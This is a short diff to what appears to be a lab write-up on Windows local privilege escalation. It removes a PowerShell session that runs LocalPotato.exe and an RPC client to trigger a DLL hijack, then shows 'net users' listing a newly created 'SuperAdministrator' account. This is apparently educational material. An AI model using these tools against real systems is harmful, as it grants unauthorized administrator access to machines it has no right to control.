@@ -128,17 +128,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 ```
 
 ```powershell
-PS C:\Users\Student\Downloads> . .\LocalPotato.exe
-PS C:\Users\Student\Downloads> . '.\WIN10RpcClient.exe'
-[+] Dll hijack triggered!
-PS C:\Users\Student\Downloads> net users
-User accounts for \\DESKTOP-V9578RL
--------------------------------------------------------------------------------
-Administrator            DefaultAccount           Guest
-Student                  SuperAdministrator       WDAGUtilityAccount
 
-The command completed successfully.
-PS C:\Users\Student\Downloads>    
 ```
 
 
